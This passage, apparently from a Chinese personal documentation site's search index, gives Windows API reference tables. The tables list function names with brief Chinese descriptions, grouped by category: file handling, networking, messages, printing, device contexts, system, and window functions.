*encode(char p[], char cipher[], int key[]){ int j; for (int i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/":{"url":"4.编程语言/Windows_API/","title":"Windows API","keywords":"","body":"目录 1、Windows_API函数分类 2、文件处理函数 3、网络函数 4、消息函数 5、打印函数 6、文本和字体函数 7、菜单函数 8、位图、图标和光栅运算函数 9、绘图函数 10、设备场景函数 11、硬件与系统函数 12、 进程和线程函数 13、控件与消息函数 Windows API包括几千个可调用的函数，它们大致可以分为以下几个大类：基本服务、组件服务、用户界面服务、图形多媒体服务、消息和协作、网络、Web服务。 Windows API所提供的七类功能详细介绍： 基础服务（Base Services）： 提供对Windows系统可用的基础资源的访问接口。比如象：文件系统（file system）、外部设备（device）、，进程（process）、线程（thread）以及访问注册表（Windows registry）和错误处理机制（error handling）。这些功能接口位于，16位Windows下的kernel.exe、krnl286.exe或krnl386.exe系统文档中；以及32位Windows下的 kernel32.dll和advapi32.dll中。 图形设备接口（GDI）： 提供功能为：输出图形内容到显示器、打印机以及其他外部输出设备。它位于16位Windows下的gdi.exe；以及32位Windows下的gdi32.dll。 图形化用户界面（GUI）： 提供的功能有创建和管理屏幕和大多数基本控件（control），比如按钮和滚动条。接收鼠标和键盘输入，以及其他与GUI有关的功能。这些调用接口位于：16位Windows下的user.exe，以及32位Windows下的user32.dll。从Windows XP版本之后，基本控件和通用对话框控件（Common Control Library）的调用接口放在comctl32.dll中。 通用对话框链接库（Common Dialog Box Library）： 为应用程序提供标准对话框，比如打开/保存文档对话框、颜色对话框和字体对话框等等。这个链接库位于：16位Windows下的commdlg.dll中，以及32位Windows下comdlg32.dll中。它被归类为User Interface API之下。 通用控件链接库（Common Control Library）：为应用程序提供接口来访问操作系统提供的一些高级控件。比如像：状态栏（status bar）、进度条（progress bars）、工具栏（toolbar）和标签（tab）。这个链接库位于：16位Windows下的commctrl.dll中，以及32位Windows下comctl32.dll中。。它被归类为User Interface API之下。 Windows外壳（Windows Shell）：作为Windows API的组成部分，不仅允许应用程序访问Windows外壳提供的功能，还对之有所改进和增强。它位于16位Windows下的shell.dll中，以及32位Windows下的shell32.dll中（Windows 95则在 shlwapi.dll中）。 它被归类为User Interface API之下。 网络服务（Network Services）：为访问操作系统提供的多种网络 功能提供接口。它包括NetBIOS、Winsock、NetDDE及RPC等。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 15:04 "},"4.编程语言/Windows_API/1、Windows_API函数分类.html":{"url":"4.编程语言/Windows_API/1、Windows_API函数分类.html","title":"1、Windows_API函数分类","keywords":"","body":"Windows API包括几千个可调用的函数，它们大致可以分为以下几个大类：基本服务、组件服务、用户界面服务、图形多媒体服务、消息和协作、网络、Web服务。 Windows API所提供的七类功能详细介绍： 基础服务（Base Services）： 提供对Windows系统可用的基础资源的访问接口。比如象：文件系统（file system）、外部设备（device）、，进程（process）、线程（thread）以及访问注册表（Windows registry）和错误处理机制（error handling）。这些功能接口位于，16位Windows下的kernel.exe、krnl286.exe或krnl386.exe系统文档中；以及32位Windows下的 kernel32.dll和advapi32.dll中。 图形设备接口（GDI）： 提供功能为：输出图形内容到显示器、打印机以及其他外部输出设备。它位于16位Windows下的gdi.exe；以及32位Windows下的gdi32.dll。 图形化用户界面（GUI）： 提供的功能有创建和管理屏幕和大多数基本控件（control），比如按钮和滚动条。接收鼠标和键盘输入，以及其他与GUI有关的功能。这些调用接口位于：16位Windows下的user.exe，以及32位Windows下的user32.dll。从Windows XP版本之后，基本控件和通用对话框控件（Common Control Library）的调用接口放在comctl32.dll中。 通用对话框链接库（Common Dialog Box Library）： 为应用程序提供标准对话框，比如打开/保存文档对话框、颜色对话框和字体对话框等等。这个链接库位于：16位Windows下的commdlg.dll中，以及32位Windows下comdlg32.dll中。它被归类为User Interface API之下。 通用控件链接库（Common Control Library）：为应用程序提供接口来访问操作系统提供的一些高级控件。比如像：状态栏（status bar）、进度条（progress bars）、工具栏（toolbar）和标签（tab）。这个链接库位于：16位Windows下的commctrl.dll中，以及32位Windows下comctl32.dll中。。它被归类为User Interface API之下。 Windows外壳（Windows Shell）：作为Windows API的组成部分，不仅允许应用程序访问Windows外壳提供的功能，还对之有所改进和增强。它位于16位Windows下的shell.dll中，以及32位Windows下的shell32.dll中（Windows 95则在 shlwapi.dll中）。 它被归类为User Interface API之下。 网络服务（Network Services）：为访问操作系统提供的多种网络 功能提供接口。它包括NetBIOS、Winsock、NetDDE及RPC等。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 15:04 "},"4.编程语言/Windows_API/10、设备场景函数.html":{"url":"4.编程语言/Windows_API/10、设备场景函数.html","title":"10、设备场景函数","keywords":"","body":" 函数名 功能描述 CombineRgn 将两个区域组合为一个新区域 CombineTransform 驱动世界转换。它相当于依顺序进行两次转换 CreateCompatibleDC 创建一个与特定设备场景一致的内存设备场景 CreateDC 为专门设备创建设备场景 CreateEllipticRgn 创建一个椭圆 CreateEllipticRgnIndirect 创建一个内切于特定矩形的椭圆区域 CreateIC 为专用设备创建一个信息场景 CreatePolygonRgn 创建一个由一系列点围成的区域 CreatePolyPolygonRgn 创建由多个多边形构成的区域。每个多边形都应是封闭的 CreateRectRgn 创建一个矩形区域 CreateRectRgnIndirect 创建一个矩形区域 CreateRoundRectRgn 创建一个圆角矩形 DeleteDC 删除专用设备场景或信息场景，释放所有相关窗口资源 DPtoLP 将点阵从设备坐标转换到专用设备场景逻辑坐标 EqualRgn 确定两个区域是否相等 ExcludeClipRect 从专用设备场景的剪裁区中去掉一个矩形区。矩形内不能进行绘图 ExcludeUpdateRgn 从专用设备场景剪裁区去掉指定窗口的刷新区域 ExtCreateRegion 根据世界转换修改区域 ExtSelectClipRgn 将指定区域组合到设备场景的当前剪裁区 FillRgn 用指定刷子填充指定区域 FrameRgn 用指定刷子围绕指定区域画一个外框 GetBoundsRect 获取指定设备场景的边界矩形 GetClipBox 获取完全包含指定设备场景剪裁区的最小矩形 GetClipRgn 获取设备场景当前剪裁区 GetDC 获取指定窗口的设备场景 GetDCEx 为指定窗口获取设备场景。相比GetDC，本函数提供了更多的选项 GetDCOrgEx 获取指定设备场景起点位置（以屏幕坐标表示） GetDeviceCaps 根据指定设备场景代表的设备的功能返回信息 GetGraphicsMode 确定是否允许增强图形模式（世界转换） GetMapMode 为特定设备场景调入映象模式 GetRegionData 装入描述一个区域信息的RgnData结构或缓冲区 GetRgnBox 获取完全包含指定区域的最小矩形 GetUpdateRgn 确定指定窗口的刷新区域。该区域当前无效，需要刷新 GetViewportExtEx 获取设备场景视口（viewport）范围 GetViewportOrgEx 获取设备场景视口起点 GetWindowDC 获取整个窗口（包括边框、滚动条、标题栏、菜单等）的设备场景 GetWindowExtEx 获取指定设备场景的窗口范围 GetWindowOrgEx 获取指定设备场景的逻辑窗口的起点 GetWindowRgn 获取窗口区域 GetWorldTransform 如果有世界转换，为设备场景获取当前世界转换 IntersectClipRect 为指定设备定义一个新的剪裁区 InvalidateRgn 使窗口指定区域不活动，并将它加入窗口刷新区，使之可随后被重画 InvertRgn 通过颠倒每个像素值反转设备场景指定区域 LPtoDP 将点阵从指定设备场景逻辑坐标转换为设备坐标 ModifyWorldTransform 根据指定的模式修改世界转换 OffsetClipRgn 按指定量平移设备场景剪裁区 OffsetRgn 按指定偏移量平移指定区域 OffsetViewportOrgEx 平移设备场景视口区域 OffsetWindowOrgEx 平移指定设备场景窗口起点 PaintRgn 用当前刷子背景色填充指定区域 PtInRegion 确定点是否在指定区域内 PtVisible 确定指定点是否可见（即，点是否在设备场景剪裁区内） RectInRegion 确定矩形是否有部分在指定区域内 RectVisible 确定指定矩形是否有部分可见（是否在设备场景剪裁区内） ReleaseDC 释放由调用GetDC或GetWindowDC函数获取的指定设备场景 RestoreDC 从设备场景堆栈恢复一个原先保存的设备场景 SaveDC 将指定设备场景状态保存到Windows设备场景堆栈 ScaleViewportExtEx 缩放设备场景视口的范围 ScaleWindowExtEx 缩放指定设备场景窗口范围 ScrollDC 在窗口（由设备场景代表）中水平和（或）垂直滚动矩形 SelectClipRgn 为指定设备场景选择新的剪裁区 SetBoundsRect 设置指定设备场景的边界矩形 SetGraphicsMode 允许或禁止增强图形模式，以提供某些支持（包括世界转换） SetMapMode 设置指定设备场景的映射模式 SetRectRgn 设置区域为指定的矩形 SetViewportExtEx 设置设备场景视口范围 SetViewportOrgEx 设置设备场景视口起点 SetWindowExtEx 设置指定设备场景窗口范围 SetWindowOrgEx 设置指定设备场景窗口起点 SetWindowRgn 设置窗口区域 SetWorldTransform 设置世界转换 ValidateRgn 激活窗口中指定区域，把它从刷新区移走 WindowFromDC 取回与某一设备场景相关的窗口的句柄 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/11、硬件与系统函数.html":{"url":"4.编程语言/Windows_API/11、硬件与系统函数.html","title":"11、硬件与系统函数","keywords":"","body":" 函数名 功能描述 ActivateKeyboardLayout 激活一个新的键盘布局。键盘布局定义了按键在一种物理性键盘上的位置与含义 Beep 用于生成简单的声音 CharToOem 将一个字串从ANSI字符集转换到OEM字符集 ClipCursor 将指针限制到指定区域 ConvertDefaultLocale 将一个特殊的地方标识符转换成真实的地方ID CreateCaret 根据指定的信息创建一个插入符（光标），并将它选定为指定窗口的默认插入符 DestroyCaret 清除（破坏）一个插入符 EnumCalendarInfo 枚举在指定\"地方\"环境中可用的日历信息 EnumDateFormats 列举指定的\"当地\"设置中可用的长、短日期格式 EnumSystemCodePages 枚举系统中已安装或支持的代码页 EnumSystemLocales 枚举系统已经安装或提供支持的\"地方\"设置 EnumTimeFormats 枚举一个指定的地方适用的时间格式 ExitWindowsEx 退出windows，并用特定的选项重新启动 ExpandEnvironmentStrings 扩充环境字串 FreeEnvironmentStrings 翻译指定的环境字串块 GetACP 判断目前正在生效的ANSI代码页 GetAsyncKeyState 判断函数调用时指定虚拟键的状态 GetCaretBlinkTime 判断插入符光标的闪烁频率 GetCaretPos 判断插入符的当前位置 GetClipCursor 取得一个矩形，用于描述目前为鼠标指针规定的剪切区域 GetCommandLine 获得指向当前命令行缓冲区的一个指针 GetComputerName 取得这台计算机的名称 GetCPInfo 取得与指定代码页有关的信息 GetCurrencyFormat 针对指定的\"地方\"设置，根据货币格式格式化一个数字 GetCursor 获取目前选择的鼠标指针的句柄 GetCursorPos 获取鼠标指针的当前位置 GetDateFormat 针对指定的\"当地\"格式，对一个系统日期进行格式化 GetDoubleClickTime 判断连续两次鼠标单击之间会被处理成双击事件的间隔时间 GetEnvironmentStrings 为包含了当前环境字串设置的一个内存块分配和返回一个句柄 GetEnvironmentVariable 取得一个环境变量的值 GetInputState 判断是否存在任何待决（等待处理）的鼠标或键盘事件 GetKBCodePage 由GetOEMCP取代，两者功能完全相同 GetKeyboardLayout 取得一个句柄，描述指定应用程序的键盘布局 GetKeyboardLayoutList 获得系统适用的所有键盘布局的一个列表 GetKeyboardLayoutName 取得当前活动键盘布局的名称 GetKeyboardState 取得键盘上每个虚拟键当前的状态 GetKeyboardType 了解与正在使用的键盘有关的信息 GetKeyNameText 在给出扫描码的前提下，判断键名 GetKeyState 针对已处理过的按键，在最近一次输入信息时，判断指定虚拟键的状态 GetLastError 针对之前调用的api函数，用这个函数取得扩展错误信息 GetLocaleInfo 取得与指定\"地方\"有关的信息 GetLocalTime 取得本地日期和时间 GetNumberFormat 针对指定的\"地方\"，按特定的格式格式化一个数字 GetOEMCP 判断在OEM和ANSI字符集间转换的windows代码页 GetQueueStatus 判断应用程序消息队列中待决（等待处理）的消息类型 GetSysColor 判断指定windows显示对象的颜色 GetSystemDefaultLangID 取得系统的默认语言ID GetSystemDefaultLCID 取得当前的默认系统\"地方\" GetSystemInfo 取得与底层硬件平台有关的信息 GetSystemMetrics 返回与windows环境有关的信息 GetSystemPowerStatus 获得与当前系统电源状态有关的信息 GetSystemTime 取得当前系统时间，这个时间采用的是\"协同世界时间\"（即UTC，也叫做GMT）格式 GetSystemTimeAdjustment 使内部系统时钟与一个外部的时钟信号源同步 GetThreadLocale 取得当前线程的地方ID GetTickCount 用于获取自windows启动以来经历的时间长度（毫秒） GetTimeFormat 针对当前指定的\"地方\"，按特定的格式格式化一个系统时间 GetTimeZoneInformation 取得与系统时区设置有关的信息 GetUserDefaultLangID 为当前用户取得默认语言ID GetUserDefaultLCID 取得当前用户的默认\"地方\"设置 GetUserName 取得当前用户的名字 GetVersion 判断当前运行的Windows和DOS版本 GetVersionEx 取得与平台和操作系统有关的版本信息 HideCaret 在指定的窗口隐藏插入符（光标） IsValidCodePage 判断一个代码页是否有效 IsValidLocale 判断地方标识符是否有效 keybd_event 这个函数模拟了键盘行动 LoadKeyboardLayout 载入一个键盘布局 MapVirtualKey 根据指定的映射类型，执行不同的扫描码和字符转换 MapVirtualKeyEx 根据指定的映射类型，执行不同的扫描码和字符转换 MessageBeep 播放一个系统声音。系统声音的分配方案是在控制面板里决定的 mouse_event 模拟一次鼠标事件 OemKeyScan 判断OEM字符集中的一个ASCII字符的扫描码和Shift键状态 OemToChar 将OEM字符集的一个字串转换到ANSI字符集 SetCaretBlinkTime 指定插入符（光标）的闪烁频率 SetCaretPos 指定插入符的位置 SetComputerName 设置新的计算机名 SetCursor 将指定的鼠标指针设为当前指针 SetCursorPos 设置指针的位置 SetDoubleClickTime 设置连续两次鼠标单击之间能使系统认为是双击事件的间隔时间 SetEnvironmentVariable 将一个环境变量设为指定的值 SetKeyboardState 设置每个虚拟键当前在键盘上的状态 SetLocaleInfo 改变用户\"地方\"设置信息 SetLocalTime 设置当前地方时间 SetSysColors 设置指定窗口显示对象的颜色 SetSystemCursor 改变任何一个标准系统指针 SetSystemTime 设置当前系统时间 SetSystemTimeAdjustment 定时添加一个校准值使内部系统时钟与一个外部的时钟信号源同步 SetThreadLocale 为当前线程设置地方 SetTimeZoneInformation 设置系统时区信息 ShowCaret 在指定的窗口里显示插入符（光标） ShowCursor 控制鼠标指针的可视性 SwapMouseButton 决定是否互换鼠标左右键的功能 SystemParametersInfo 获取和设置数量众多的windows系统参数 SystemTimeToTzSpecificLocalTime 将系统时间转换成地方时间 ToAscii 根据当前的扫描码和键盘信息，将一个虚拟键转换成ASCII字符 ToUnicode 根据当前的扫描码和键盘信息，将一个虚拟键转换成Unicode字符 UnloadKeyboardLayout 卸载指定的键盘布局 VkKeyScan 针对Windows字符集中一个ASCII字符，判断虚拟键码和Shift键的状态 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/13、控件与消息函数.html":{"url":"4.编程语言/Windows_API/13、控件与消息函数.html","title":"13、控件与消息函数","keywords":"","body":" 函数名 功能描述 AdjustWindowRect 给定一种窗口样式，计算获得目标客户区矩形所需的窗口大小 AnyPopup 判断屏幕上是否存在任何弹出式窗口 ArrangeIconicWindows 排列一个父窗口的最小化子窗口 AttachThreadInput 连接线程输入函数 BeginDeferWindowPos 启动构建一系列新窗口位置的过程 BringWindowToTop 将指定的窗口带至窗口列表顶部 CascadeWindows 以层叠方式排列窗口 ChildWindowFromPoint 返回父窗口中包含了指定点的第一个子窗口的句柄 ClientToScreen 判断窗口内以客户区坐标表示的一个点的屏幕坐标 CloseWindow 最小化指定的窗口 CopyRect 矩形内容复制 DeferWindowPos 该函数为特定的窗口指定一个新窗口位置 DestroyWindow 清除指定的窗口以及它的所有子窗口 DrawAnimatedRects 描绘一系列动态矩形 EnableWindow 指定的窗口里允许或禁止所有鼠标及键盘输入 EndDeferWindowPos 同时更新DeferWindowPos调用时指定的所有窗口的位置及状态 EnumChildWindows 为指定的父窗口枚举子窗口 EnumThreadWindows 枚举与指定任务相关的窗口 EnumWindows 枚举窗口列表中的所有父窗口 EqualRect 判断两个矩形结构是否相同 FindWindow 寻找窗口列表中第一个符合指定条件的顶级窗口 FindWindowEx 在窗口列表中寻找与指定条件相符的第一个子窗口 FlashWindow 闪烁显示指定窗口 GetActiveWindow 获得活动窗口的句柄 GetCapture 获得一个窗口的句柄，这个窗口位于当前输入线程，且拥有鼠标捕获（鼠标活动由它接收） GetClassInfo 取得WNDCLASS结构（或WNDCLASSEX结构）的一个副本，结构中包含了与指定类有关的信息 GetClassLong 取得窗口类的一个Long变量条目 GetClassName 为指定的窗口取得类名 GetClassWord 为窗口类取得一个整数变量 GetClientRect 返回指定窗口客户区矩形的大小 GetDesktopWindow 获得代表整个屏幕的一个窗口（桌面窗口）句柄 GetFocus 获得拥有输入焦点的窗口的句柄 GetForegroundWindow 获得前台窗口的句柄 GetLastActivePopup 获得在一个给定父窗口中最近激活过的弹出式窗口的句柄 GetParent 判断指定窗口的父窗口 GetTopWindow 搜索内部窗口列表，寻找隶属于指定窗口的头一个窗口的句柄 GetUpdateRect 获得一个矩形，它描叙了指定窗口中需要更新的那一部分 GetWindow 获得一个窗口的句柄，该窗口与某源窗口有特定的关系 GetWindowContextHelpId 取得与窗口关联在一起的帮助场景ID GetWindowLong 从指定窗口的结构中取得信息 GetWindowPlacement 获得指定窗口的状态及位置信息 GetWindowRect 获得整个窗口的范围矩形，窗口的边框、标题栏、滚动条及菜单等都在这个矩形内 GetWindowText 取得一个窗体的标题（caption）文字，或者一个控件的内容 GetWindowTextLength 调查窗口标题文字或控件内容的长短 GetWindowWord 获得指定窗口结构的信息 InflateRect 增大或减小一个矩形的大小 IntersectRect 这个函数在lpDestRect里载入一个矩形，它是lpSrc1Rect与lpSrc2Rect两个矩形的交集 InvalidateRect 屏蔽一个窗口客户区的全部或部分区域 IsChild 判断一个窗口是否为另一窗口的子或隶属窗口 IsIconic 判断窗口是否已最小化 IsRectEmpty 判断一个矩形是否为空 IsWindow 判断一个窗口句柄是否有效 IsWindowEnabled 判断窗口是否处于活动状态 IsWindowUnicode 判断一个窗口是否为Unicode窗口。这意味着窗口为所有基于文本的消息都接收Unicode文字 IsWindowVisible 判断窗口是否可见 IsZoomed 判断窗口是否最大化 LockWindowUpdate 锁定指定窗口，禁止它更新 MapWindowPoints 将一个窗口客户区坐标的点转换到另一窗口的客户区坐标系统 MoveWindow 改变指定窗口的位置和大小 OffsetRect 通过应用一个指定的偏移，从而让矩形移动起来 OpenIcon 恢复一个最小化的程序，并将其激活 PtInRect 判断指定的点是否位于矩形内部 RedrawWindow 重画全部或部分窗口 ReleaseCapture 为当前的应用程序释放鼠标捕获 ScreenToClient 判断屏幕上一个指定点的客户区坐标 ScrollWindow 滚动窗口客户区的全部或一部分 ScrollWindowEx 根据附加的选项，滚动窗口客户区的全部或部分 SetActiveWindow 激活指定的窗口 SetCapture 将鼠标捕获设置到指定的窗口 SetClassLong 为窗口类设置一个Long变量条目 SetClassWord 为窗口类设置一个条目 SetFocusAPI 将输入焦点设到指定的窗口。如有必要，会激活窗口 SetForegroundWindow 将窗口设为系统的前台窗口 SetParent 指定一个窗口的新父 SetRect 设置指定矩形的内容 SetRectEmpty 将矩形设为一个空矩形 SetWindowContextHelpId 为指定的窗口设置帮助场景（上下文）ID SetWindowLong 在窗口结构中为指定的窗口设置信息 SetWindowPlacement 设置窗口状态和位置信息 SetWindowPos 为窗口指定一个新位置和状态 SetWindowText 设置窗口的标题文字或控件的内容 SetWindowWord 在窗口结构中为指定的窗口设置信息 ShowOwnedPopups 显示或隐藏由指定窗口所有的全部弹出式窗口 ShowWindow 控制窗口的可见性 ShowWindowAsync 与ShowWindow相似 SubtractRect 装载矩形lprcDst，它是在矩形lprcSrc1中减去lprcSrc2得到的结果 TileWindows 以平铺顺序排列窗口 UnionRect 装载一个lpDestRect目标矩形，它是lpSrc1Rect和lpSrc2Rect联合起来的结果 UpdateWindow 强制立即更新窗口 ValidateRect 校验窗口的全部或部分客户区 WindowFromPoint 返回包含了指定点的窗口的句柄。忽略屏蔽、隐藏以及透明窗口 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/2、文件处理函数.html":{"url":"4.编程语言/Windows_API/2、文件处理函数.html","title":"2、文件处理函数","keywords":"","body":" 函数名 功能描述 CloseHandle 关闭一个内核对象。其中包括文件、文件映射、进程、线程、安全和同步对象等 CompareFileTime 对比两个文件的时间 CopyFile 复制文件 CreateDirectory 创建一个新目录 CreateFile 打开和创建文件、管道、邮槽、通信服务、设备以及控制台 CreateFileMapping 创建一个新的文件映射对象 DeleteFile 删除指定文件 DeviceIoControl 对设备执行指定的操作 DosDateTimeToFileTime 将DOS日期和时间值转换成一个 win32 FILETIME 值 FileTimeToDosDateTime 将一个 win32 FILETIME 值转换成DOS日期和时间值 FileTimeToLocalFileTime 将一个FILETIME结构转换成本地时间 FileTimeToSystemTime 根据一个FILETIME结构的内容，装载一个SYSTEMTIME结构 FindClose 关闭由FindFirstFile函数创建的一个搜索句柄 FindFirstFile 根据文件名查找文件 FindNextFile 根据调用FindFirstFile函数时指定的一个文件名查找下一个文件 FlushFileBuffers 针对指定的文件句柄，刷新内部文件缓冲区 FlushViewOfFile 将写入文件映射缓冲区的所有数据都刷新到磁盘 GetBinaryType 判断文件是否可以执行 GetCompressedFileSize 判断一个压缩文件在磁盘上实际占据的字节数 GetCurrentDirectory 获取当前进程的所在目录 GetDiskFreeSpace 获取与一个磁盘的组织有关的信息，以及了解剩余空间的容量 GetDiskFreeSpaceEx 获取与一个磁盘的组织以及剩余空间容量有关的信息 GetDriveType 判断一个磁盘驱动器的类型 GetExpandedName 取得一个压缩文件的全名 GetFileAttributes 判断指定文件的属性 GetFileInformationByHandle 这个函数提供了获取文件信息的一种机制 GetFileSize 判断文件长度 GetFileTime 取得指定文件的时间信息 GetFileType 在给出文件句柄的前提下，判断文件类型 GetFileVersionInfo 从支持版本标记的一个模块里获取文件版本信息 GetFileVersionInfoSize 针对包含了版本资源的一个文件，判断容纳文件版本信息需要一个多大的缓冲区 GetFullPathName 获取指定文件的完整路径名 GetLogicalDrives 判断系统中存在哪些逻辑驱动器字母 GetLogicalDriveStrings 获取一个字串，其中包含了当前所有逻辑驱动器的根驱动器路径 GetOverlappedResult 判断一个重叠操作当前的状态 GetPrivateProfileInt 为初始化文件（.ini文件）中指定的条目获取一个整数值 GetPrivateProfileSection 获取指定小节（在.ini文件中）所有项名和值的一个列表 GetPrivateProfileString 为初始化文件中指定的条目取得字串 GetProfileInt 取得win.ini初始化文件中指定条目的一个整数值 GetProfileSection 获取指定小节（在win.ini文件中）所有项名和值的一个列表 GetProfileString 为win.ini初始化文件中指定的条目取得字串 GetShortPathName 获取指定文件的短路径名 GetSystemDirectory 取得Windows系统目录（即System目录）的完整路径名 GetTempFileName 这个函数包含了一个临时文件的名字，它可由应用程序使用 GetTempPath 获取为临时文件指定的路径 GetVolumeInformation 获取与一个磁盘卷有关的信息 GetWindowsDirectory 获取Windows目录的完整路径名 hread 参考lread hwrite 参考lwrite函数 lclose 关闭指定的文件 lcreat 创建一个文件 llseek 设置文件中进行读写的当前位置 LockFile 锁定文件的某一部分，使其不与其他应用程序共享 LockFileEx 与LockFile相似，只是它提供了更多的功能 lopen 以二进制模式打开指定的文件 lread 将文件中的数据读入内存缓冲区 lwrite 将数据从内存缓冲区写入一个文件 LZClose 关闭由LZOpenFile 或 LZInit函数打开的一个文件 LZCopy 复制一个文件 LZInit 这个函数用于初始化内部缓冲区 LZOpenFile 该函数能执行大量不同的文件处理，而且兼容于压缩文件 LZRead 将数据从文件读入内存缓冲区 LZSeek 设置一个文件中进行读写的当前位置 MapViewOfFile 将一个文件映射对象映射到当前应用程序的地址空间 MoveFile 移动文件 OpenFile 这个函数能执行大量不同的文件操作 OpenFileMapping 打开一个现成的文件映射对象 QueryDosDevice 在Windows NT中，DOS设备名会映射成NT系统设备名。该函数可判断当前的设备映射情况 ReadFile 从文件中读出数据 ReadFileEx 与ReadFile相似，只是它只能用于异步读操作，并包含了一个完整的回调 RegCloseKey 关闭系统注册表中的一个项（或键） RegConnectRegistry 访问远程系统的部分注册表 RegCreateKey 在指定的项下创建或打开一个项 RegCreateKeyEx 在指定项下创建新项的更复杂的方式。在Win32环境中建议使用这个函数 RegDeleteKey 删除现有项下方一个指定的子项 RegDeleteValue 删除指定项下方的一个值 RegEnumKey 枚举指定项的子项。在Win32环境中应使用RegEnumKeyEx RegEnumKeyEx 枚举指定项下方的子项 RegEnumValue 枚举指定项的值 RegFlushKey 将对项和它的子项作出的改动实际写入磁盘 RegGetKeySecurity 获取与一个注册表项有关的安全信息 RegLoadKey 从以前用RegSaveKey函数创建的一个文件里装载注册表信息 RegNotifyChangeKeyValue 注册表项或它的任何一个子项发生变化时，用这个函数提供一种通知机制 RegOpenKey 打开一个现有的注册表项 RegOpenKeyEx 打开一个现有的项。在win32下推荐使用这个函数 RegQueryInfoKey 获取与一个项有关的信息 RegQueryValue 取得指定项或子项的默认（未命名）值 RegQueryValueEx 获取一个项的设置值 RegReplaceKey 用一个磁盘文件保存的信息替换注册表信息；并创建一个备份，在其中包含当前注册表信息 RegRestoreKey 从一个磁盘文件恢复注册表信息 RegSaveKey 将一个项以及它的所有子项都保存到一个磁盘文件 RegSetKeySecurity 设置指定项的安全特性 RegSetValue 设置指定项或子项的默认值 RegSetValueEx 设置指定项的值 RegUnLoadKey 卸载指定的项以及它的所有子项 RemoveDirectory 删除指定目录 SearchPath 查找指定文件 SetCurrentDirectory 设置当前目录 SetEndOfFile 针对一个打开的文件，将当前文件位置设为文件末尾 SetFileAttributes 设置文件属性 SetFilePointer 在一个文件中设置当前的读写位置 SetFileTime 设置文件的创建、访问及上次修改时间 SetHandleCount 这个函数不必在win32下使用；即使使用，也不会有任何效果 SetVolumeLabel 设置一个磁盘的卷标（Label） SystemTimeToFileTime 根据一个FILETIME结构的内容，载入一个SYSTEMTIME结构 UnlockFile 解除对一个文件的锁定 UnlockFileEx 解除对一个文件的锁定 UnmapViewOfFile 在当前应用程序的内存地址空间解除对一个文件映射对象的映射 VerFindFile 用这个函数决定一个文件应安装到哪里 VerInstallFile 用这个函数安装一个文件 VerLanguageName 这个函数能根据16位语言代码获取一种语言的名称 VerQueryValue 这个函数用于从版本资源中获取信息 WriteFile 将数据写入一个文件 WriteFileEx 与WriteFile类似，只是它只能用于异步写操作，并包括了一个完整的回调 WritePrivateProfileSection 为一个初始化文件（.ini）中指定的小节设置所有项名和值 WritePrivateProfileString 在初始化文件指定小节内设置一个字串 WriteProfileSection 为Win.ini初始化文件中一个指定的小节设置所有项名和值 WriteProfileString 在Win.ini初始化文件指定小节内设置一个字串 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 15:04 "},"4.编程语言/Windows_API/3、网络函数.html":{"url":"4.编程语言/Windows_API/3、网络函数.html","title":"3、网络函数","keywords":"","body":" 函数名 功能描述 WNetAddConnection 创建同一个网络资源的永久性连接 WNetAddConnection2 创建同一个网络资源的连接 WNetAddConnection3 创建同一个网络资源的连接 WNetCancelConnection 结束一个网络连接 WNetCancelConnection2 结束一个网络连接 WNetCloseEnum 结束一次枚举操作 WNetConnectionDialog 启动一个标准对话框，以便建立同网络资源的连接 WNetDisconnectDialog 启动一个标准对话框，以便断开同网络资源的连接 WNetEnumResource 枚举网络资源 WNetGetConnection 获取本地或已连接的一个资源的网络名称 WNetGetLastError 获取网络错误的扩展错误信息 WNetGetUniversalName 获取网络中一个文件的远程名称以及/或者UNC（统一命名规范）名称 WNetGetUser 获取一个网络资源用以连接的名字 WNetOpenEnum 启动对网络资源进行枚举的过程 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/4、消息函数.html":{"url":"4.编程语言/Windows_API/4、消息函数.html","title":"4、消息函数","keywords":"","body":" 函数名 功能描述 BroadcastSystemMessage 将一条系统消息广播给系统中所有的顶级窗口 GetMessagePos 取得消息队列中上一条消息处理完毕时的鼠标指针屏幕位置 GetMessageTime 取得消息队列中上一条消息处理完毕时的时间 PostMessage 将一条消息投递到指定窗口的消息队列 PostThreadMessage 将一条消息投递给应用程序 RegisterWindowMessage 获取分配给一个字串标识符的消息编号 ReplyMessage 答复一个消息 SendMessage 调用一个窗口的窗口函数，将一条消息发给那个窗口 SendMessageCallback 将一条消息发给窗口 SendMessageTimeout 向窗口发送一条消息 SendNotifyMessage 向窗口发送一条消息 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/5、打印函数.html":{"url":"4.编程语言/Windows_API/5、打印函数.html","title":"5、打印函数","keywords":"","body":" 函数名 功能描述 AbortDoc 取消一份文档的打印 AbortPrinter 删除与一台打印机关联在一起的缓冲文件 AddForm 为打印机的表单列表添加一个新表单 AddJob 用于获取一个有效的路径名，以便用它为作业创建一个后台打印文件。它也会为作业分配一个作业编号 AddMonitor 为系统添加一个打印机监视器 AddPort 启动\"添加端口\"对话框，允许用户在系统可用端口列表中加入一个新端口 AddPrinter 在系统中添加一台新打印机 AddPrinterConnection 连接指定的打印机 AddPrinterDriver 为指定的系统添加一个打印驱动程序 AddPrintProcessor 为指定的系统添加一个打印处理器 AddPrintProvidor 为系统添加一个打印供应商 AdvancedDocumentProperties 启动打印机文档设置对话框 ClosePrinter 关闭一个打开的打印机对象 ConfigurePort 针对指定的端口，启动一个端口配置对话框 